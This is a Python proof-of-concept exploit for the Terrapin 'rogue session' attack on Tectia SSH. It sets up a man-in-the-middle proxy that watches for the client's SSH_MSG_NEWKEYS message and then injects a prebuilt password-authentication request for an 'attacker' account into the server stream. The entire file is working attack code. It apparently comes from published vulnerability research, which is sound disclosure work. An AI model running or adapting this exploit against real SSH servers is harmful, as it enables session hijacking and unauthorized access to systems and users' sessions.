#!/usr/bin/python3
from binascii import unhexlify
import socket
from threading import Thread
from time import sleep

import click

###
### PoC for Tectia rogue session attack based on the Terrapin artifacts by Bäumer et al.
### See https://github.com/RUB-NDS/Terrapin-Artifacts
###

@click.command()
@click.option("--proxy-ip", default="0.0.0.0", help="The interface address to bind the TCP proxy to.")
@click.option("--proxy-port", default=22, help="The port to bind the TCP proxy to.")
@click.option("--server-ip", help="The IP address where the AsyncSSH server is running.")
@click.option("--server-port", default=22, help="The port where the AsyncSSH server is running.")
def cli(proxy_ip, proxy_port, server_ip, server_port):
    print("--- Proof of Concept for the rogue session attack (Tectia SSH) ---", flush=True)
    mitm_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    mitm_socket.bind((proxy_ip, proxy_port))
    mitm_socket.listen(5)

    print(f"[+] MitM Proxy started. Listening on {(proxy_ip, proxy_port)} for incoming connections...", flush=True)

    try:
        while True:
            client_socket, client_addr = mitm_socket.accept()
            print(f"[+] Accepted connection from: {client_addr}", flush=True)
            print(f"[+] Establishing new server connection to {(server_ip, server_port)}.", flush=True)
            server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server_socket.connect((server_ip, server_port))
            print("[+] Spawning new forwarding threads to handle client connection.", flush=True)
            Thread(target=forward_client_to_server, args=(client_socket, server_socket)).start()
            Thread(target=forward_server_to_client, args=(client_socket, server_socket)).start()
    except KeyboardInterrupt:
        client_socket.close()
        server_socket.close()
        mitm_socket.close()

newkeys_payload = b'\x00\x00\x00\x0c\x0a\x15'
def contains_newkeys(data):
    return newkeys_payload in data

###
### This authentication request contains a password authentication for the user attacker with password 'attacker'.
### Requirement for this PoC is that a user of said name and password exists.
###
rogue_userauth_request = unhexlify('000000440b320000000861747461636b65720000000e7373682d636f6e6e656374696f6e0000000870617373776f7264000000000861747461636b65720000000000000000000000')
def forward_client_to_server(client_socket, server_socket):
    try:
        while True:
            sleep(0.5)
            client_data = client_socket.recv(4096)
            if len(client_data) == 0:
                break
            if contains_newkeys(client_data):
                print("[+] SSH_MSG_NEWKEYS sent by client identified!", flush=True)
                server_socket.send(rogue_userauth_request)
            server_socket.send(client_data)
    except ConnectionResetError:
        print("[!] Client connection has been reset. Continue closing sockets.", flush=True)
    print("[!] forward_client_to_server thread ran out of data, closing sockets!", flush=True)
    client_socket.close()
    server_socket.close()

def forward_server_to_client(client_socket, server_socket):
    try:
        while True:
            server_data = server_socket.recv(4096)
            if len(server_data) == 0:
                break
            print("[d] server_data received (len " + str(len(server_data)) + ")")
            client_socket.send(server_data)
    except ConnectionResetError:
        print("[!] Target connection has been reset. Continue closing sockets.", flush=True)
    print("[!] forward_server_to_client thread ran out of data, closing sockets!", flush=True)
    client_socket.close()
    server_socket.close()

if __name__ == '__main__':
    cli()
